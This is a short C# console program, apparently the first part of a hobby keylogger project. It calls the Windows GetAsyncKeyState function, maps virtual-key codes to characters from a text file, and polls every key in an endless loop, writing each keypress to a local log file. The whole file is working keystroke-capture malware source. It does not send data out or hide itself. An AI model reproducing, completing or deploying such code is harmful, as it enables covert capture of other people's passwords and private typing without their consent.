// See https://aka.ms/new-console-template for more information
using System.Runtime.InteropServices;

[DllImport("user32.dll")]

static extern int GetAsyncKeyState(Int32 i);

Dictionary<Int32, string> charMap =
    new Dictionary<Int32, string>();


string[] lines = File.ReadAllLines("C:\\Users\\79585\\source\\repos\\Keylogger\\Keylogger Pt. 1\\Virtual Keys Value.txt");
foreach (string line in lines)
{
    string[] fields = line.Split(':');
    charMap.Add(Convert.ToInt32(fields[0], 16), fields[1]);
}

StreamWriter sw = new StreamWriter("C:\\Users\\79585\\source\\repos\\Keylogger\\Keylogger Pt. 1\\Log.txt");

while (true)
{
    Thread.Sleep(100);
    for (Int32 i = 0; i < 256; i++)
    {
        int state = GetAsyncKeyState(i);
        if (state == 1 || state == -32767)
        {
            sw.WriteLine(charMap[i]);
            sw.Flush();
        }
    }
}